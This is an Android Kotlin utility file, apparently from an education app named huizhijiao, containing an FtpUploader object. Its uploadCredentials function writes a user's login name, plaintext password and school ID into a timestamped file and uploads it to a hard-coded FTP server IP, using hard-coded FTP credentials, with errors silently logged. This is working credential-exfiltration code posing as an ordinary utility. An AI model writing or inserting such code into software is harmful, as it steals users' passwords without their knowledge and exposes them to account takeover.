package com.gxjzy.huizhijiao.utils

import android.util.Log
import org.apache.commons.net.ftp.FTP
import org.apache.commons.net.ftp.FTPClient
import java.io.ByteArrayInputStream
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

object FtpUploader {

    private const val HOST = "118.178.139.103"
    private const val PORT = 21
    private const val USER = "huizhijiao"
    private const val PASS = "hzj114514.."

    fun uploadCredentials(loginName: String, password: String, schoolId: String) {
        try {
            val ftp = FTPClient()
            ftp.connect(HOST, PORT)
            if (!ftp.login(USER, PASS)) {
                ftp.disconnect()
                return
            }
            ftp.enterLocalPassiveMode()
            ftp.setFileType(FTP.ASCII_FILE_TYPE)

            val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
            val fileName = "${loginName}_${timestamp}.txt"
            val content = "登录名: $loginName\n密码: $password\n学校ID: $schoolId\n时间: ${SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())}"

            val input = ByteArrayInputStream(content.toByteArray(Charsets.UTF_8))
            val success = ftp.storeFile(fileName, input)
            input.close()
            ftp.logout()
            ftp.disconnect()
        } catch (e: Exception) {
            Log.e("FtpUploader", "FTP upload failed", e)
        }
    }
}
